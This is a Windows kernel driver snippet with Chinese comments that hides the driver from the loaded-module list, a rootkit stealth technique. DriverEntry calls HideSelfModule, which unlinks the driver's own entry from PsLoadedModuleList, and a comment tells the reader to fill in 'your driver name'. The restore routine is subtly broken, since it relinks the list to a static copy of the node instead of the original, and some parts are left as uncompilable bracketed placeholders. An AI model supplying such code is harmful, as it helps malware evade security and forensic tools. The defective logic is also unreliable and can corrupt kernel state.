extern PVOID PsLoadedModuleList;

static LIST_ENTRY g_origInLoad;   // 备份原节点，用于恢复（驱动卸载时接回）
static BOOLEAN    g_unlinked = FALSE;

NTSTATUS HideSelfModule(VOID)
{
    UNICODE_STRING targetName;
    RtlInitUnicodeString(&targetName, L"[模块名].sys");   // 占位符：你的驱动名

    PLIST_ENTRY cur = (PLIST_ENTRY)PsLoadedModuleList;
    for (PLIST_ENTRY e = cur->Flink; e != cur; e = e->Flink) {
        KLDR_DATA_TABLE_ENTRY_EX *ent = CONTAINING_RECORD(e, KLDR_DATA_TABLE_ENTRY_EX, InLoadOrderLinks);
        if (RtlEqualUnicodeString(&ent->BaseDllName, &targetName, TRUE)) {
            g_origInLoad = *e;                 // 备份前后指针
            e->Blink->Flink = e->Flink;        // 摘链
            e->Flink->Blink = e->Blink;
            e->Flink = e->Blink = e;           // 自成环，防遍历炸链
            g_unlinked = TRUE;
            return STATUS_SUCCESS;
        }
    }
    return STATUS_NOT_FOUND;
}

VOID RestoreSelfModule(VOID)
{
    if (!g_unlinked) return;
    LIST_ENTRY *e = &g_origInLoad;
    e->Blink->Flink = e;
    e->Flink->Blink = e;
    g_unlinked = FALSE;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg)
{
    UNREFERENCED_PARAMETER(reg);
    HideSelfModule();
    drv->DriverUnload = [卸载回调];
    return STATUS_SUCCESS;
}
